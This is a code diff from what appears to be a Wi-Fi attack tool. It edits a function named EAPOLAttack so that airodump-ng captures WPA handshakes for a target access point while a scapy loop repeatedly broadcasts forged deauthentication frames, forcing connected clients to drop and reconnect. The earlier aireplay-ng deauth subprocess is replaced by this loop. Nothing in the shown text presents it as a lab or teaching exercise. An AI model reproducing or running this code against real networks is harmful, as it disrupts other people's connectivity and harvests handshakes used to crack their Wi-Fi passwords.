@@ -276,16 +276,21 @@ def EAPOLAttack(interface, channel, bssid, essid):
     print("Started Listening for EAPOL Packets for BSSID:", bssid)
     
     airodump = ["sudo", "airodump-ng", "--channel", str(channel), "--bssid", bssid, "--write-interval", "1", "--output-format", "pcap,csv", "-w", "dumps/dump", interface]
-    aireplay = ["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, interface]
 
     eapol = subprocess.Popen(airodump, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, start_new_session=True)
     time.sleep(3)
-    deauth = subprocess.Popen(aireplay, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
 
     while attacking:
         parseCSV("dumps/dump-01.csv")
         for ap in AccessPoints:
             socket.emit("attackInfo", [ap.essid, ap.bssid, ap.channel, ap.signal + f" ({ap.signalStrength})", ap.security, ap.clients])
+
+
+        dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
+
+        packet = RadioTap() / dot11 / Dot11Deauth(reason=1)
+
+        sendp(packet, iface=interface, count=20, inter=0.001, verbose=True)
 
         i = eapol.stdout.readline()
 
@@ -310,15 +315,7 @@ def EAPOLAttack(interface, channel, bssid, essid):
     else:
         print("Terminating EAPOL Scan")
 
-    try:
-        os.killpg(os.getpgid(deauth.pid), signal.SIGKILL)
-    except ProcessLookupError:
-        pass
-    else:
-        print("Terminating Deauthentication Attack")
-
     eapol.wait()
-    deauth.wait()
 
     CSVCleaner()
 ## Start Attack ##
